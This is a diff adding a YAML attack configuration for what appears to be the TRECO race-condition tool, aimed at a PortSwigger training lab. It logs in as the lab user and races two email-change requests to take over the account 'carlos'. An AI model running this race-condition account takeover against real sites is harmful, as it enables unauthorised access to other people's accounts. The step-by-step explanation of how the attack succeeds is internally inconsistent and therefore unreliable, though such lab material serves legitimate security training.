@@ -1,0 +1,190 @@
+# ============================================================================
+# TRECO Configuration: PortSwigger Lab 4 - Single-Endpoint Race Conditions
+# ============================================================================
+#
+# Lab URL: https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint
+#
+# This lab's email change functionality contains a race condition that makes
+# it vulnerable to account takeover. To solve the lab, you need to exploit
+# this race condition by sending two simultaneous requests to change the email
+# - one with your email and one with the victim's email (carlos).
+#
+# Objective: Use race conditions with different emails per thread to take over
+# carlos's account.
+#
+# Usage:
+#   export LAB_HOST="YOUR-LAB-ID.web-security-academy.net"
+#   export EXPLOIT_SERVER="YOUR-EXPLOIT-SERVER.exploit-server.net"
+#   treco examples/portswigger/single-endpoint-race/attack.yaml
+#
+# ============================================================================
+
+metadata:
+  name: "PortSwigger Lab 4 - Single-Endpoint Race Conditions"
+  version: "1.0"
+  author: "TRECO Team"
+  vulnerability: "CWE-362"
+  description: |
+    Exploits a race condition in the email change endpoint to take over
+    carlos's account. Two threads simultaneously send requests with different
+    emails to the same endpoint.
+
+target:
+  host: "{{ env('LAB_HOST', '0a1b2c3d4e5f.web-security-academy.net') }}"
+  port: 443
+  tls:
+    enabled: true
+    verify_cert: false
+  http:
+    follow_redirects: false
+  proxy:
+    type: http
+    host: 127.0.0.1
+    port: 8080
+
+entrypoint:
+  state: login_wiener
+  input:
+    wiener_username: "wiener"
+    wiener_password: "peter"
+    exploit_server: "{{ env('EXPLOIT_SERVER', 'exploit-server.net') }}"
+
+# ============================================================================
+# STATES
+# ============================================================================
+
+states:
+  # Step 1: Login as wiener to get a valid session
+  login_wiener:
+    description: "Login as wiener to get a session token"
+    
+    request: |
+      POST /login HTTP/1.1
+      Host: {{ target.host }}
+      Content-Type: application/x-www-form-urlencoded
+      
+      username={{ wiener_username }}&password={{ wiener_password }}
+    
+    extract:
+      session:
+        type: cookie
+        pattern: session
+    
+    logger:
+      on_state_enter: |
+        ╔══════════════════════════════════════════════════════════════════════════════╗
+        ║  🔐 PortSwigger Lab 4: Single-Endpoint Race Conditions                       ║
+        ╠══════════════════════════════════════════════════════════════════════════════╣
+        ║  Target:        {{ "%-59s" | format(target.host)                          }} ║
+        ║  Exploit Server: {{ "%-58s" | format(exploit_server)                      }} ║
+        ║  Strategy:      Race 2 email changes with different emails simultaneously  ║
+        ║  Mode:          DISTRIBUTE (Thread 0: attacker, Thread 1: carlos)          ║
+        ╚══════════════════════════════════════════════════════════════════════════════╝
+        
+        🔑 Step 1: Logging in as wiener...
+      
+      on_state_leave: |
+        {% if response.status_code == 302 %}
+        ✅ Logged in as wiener
+        🍪 Session: {{ login_wiener.session[:30] }}...
+        {% else %}
+        ❌ Login failed! Status: {{ response.status_code }}
+        {% endif %}
+    
+    next:
+      - on_status: 302
+        goto: race_email_change
+
+  # Step 2: Race condition on email change endpoint
+  race_email_change:
+    description: "Race condition with two different emails"
+    
+    # State-level input override: Use different emails for this specific attack
+    input:
+      emails:
+        - "attacker@{{ exploit_server }}"
+        - "carlos@{{ target.host }}"
+    
+    # This demonstrates state-level input override and distribute mode
+    race:
+      threads: 2  # Exactly 2 threads
+      input_mode: distribute  # Thread 0 gets email[0], Thread 1 gets email[1]
+      sync_mechanism: barrier
+      connection_strategy: preconnect
+      thread_propagation: single
+    
+    request: |
+      POST /my-account/change-email HTTP/1.1
+      Host: {{ target.host }}
+      Cookie: session={{ login_wiener.session }}
+      Content-Type: application/x-www-form-urlencoded
+      
+      email={{ input.email }}
+    
+    logger:
+      on_state_enter: |
+        
+        ⚡ Step 2: Racing email change requests...
+        
+        Thread 0 will send: email=attacker@{{ exploit_server }}
+        Thread 1 will send: email=carlos@{{ target.host }}
+        
+      on_thread_leave: |
+        {% if response.status_code == 302 or response.status_code == 200 %}
+        🟢 Thread {{ thread.id }}: Email change to "{{ input.email }}" - Status {{ response.status_code }}
+        {% else %}
+        🔴 Thread {{ thread.id }}: Failed to change to "{{ input.email }}" - Status {{ response.status_code }}
+        {% endif %}
+      
+      on_state_leave: |
+        
+        ╔══════════════════════════════════════════════════════════════════════════════╗
+        ║  📊 RACE ATTACK RESULTS                                                      ║
+        ╚══════════════════════════════════════════════════════════════════════════════╝
+        
+        Race completed. Both email change requests were sent simultaneously.
+        
+        💡 Next steps to solve the lab:
+        1. Check your exploit server access log for a request from carlos
+        2. If you see carlos accessing your exploit server, the race succeeded!
+        3. Use the stolen session to access carlos's account
+        
+        ╔══════════════════════════════════════════════════════════════════════════════╗
+        ║  🎯 EXPECTED BEHAVIOR                                                        ║
+        ╠══════════════════════════════════════════════════════════════════════════════╣
+        ║  Due to the race condition, one request should complete while the other is  ║
+        ║  being processed. This can cause:                                            ║
+        ║  1. Your email is set on wiener's account (attacker@exploit-server)          ║
+        ║  2. Carlos's email validation token is sent to YOUR exploit server           ║
+        ║  3. You can use that token to confirm carlos's email change                  ║
+        ║  4. Access carlos's account with the confirmed email                         ║
+        ╚══════════════════════════════════════════════════════════════════════════════╝
+    
+    next:
+      - goto: check_exploit_logs
+
+  # Step 3: Instructions for manual verification
+  check_exploit_logs:
+    description: "Instructions for completing the lab"
+    
+    request: |
+      GET / HTTP/1.1
+      Host: {{ target.host }}
+      Cookie: session={{ login_wiener.session }}
+    
+    logger:
+      on_state_enter: |
+        
+        ╔══════════════════════════════════════════════════════════════════════════════╗
+        ║  📋 MANUAL STEPS TO COMPLETE THE LAB                                         ║
+        ╠══════════════════════════════════════════════════════════════════════════════╣
+        ║  1. Go to your exploit server and check the access log                       ║
+        ║  2. Look for a GET request containing a token parameter                      ║
+        ║  3. The request should look like:                                            ║
+        ║     GET /?token=XXXXX                                                        ║
+        ║  4. Copy the token value                                                     ║
+        ║  5. Visit the email confirmation URL with that token:                        ║
+        ║     https://{{ target.host }}/my-account/change-email?token=XXXXX            ║
+        ║  6. This will confirm carlos's email change to your exploit server address   ║
+        ║  7. Lab should be marked as solved!                                          ║
+        ╚══════════════════════════════════════════════════════════════════════════════╝
